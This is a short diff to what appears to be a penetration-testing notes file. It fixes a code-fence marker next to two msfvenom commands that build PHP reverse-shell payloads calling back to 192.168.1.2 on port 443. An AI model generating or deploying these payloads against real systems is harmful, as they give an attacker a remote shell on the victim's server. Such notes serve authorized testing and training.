@@ -136,7 +136,7 @@
 
 ```cmd
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
-```cmd
+```
 
   ```msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php```
 
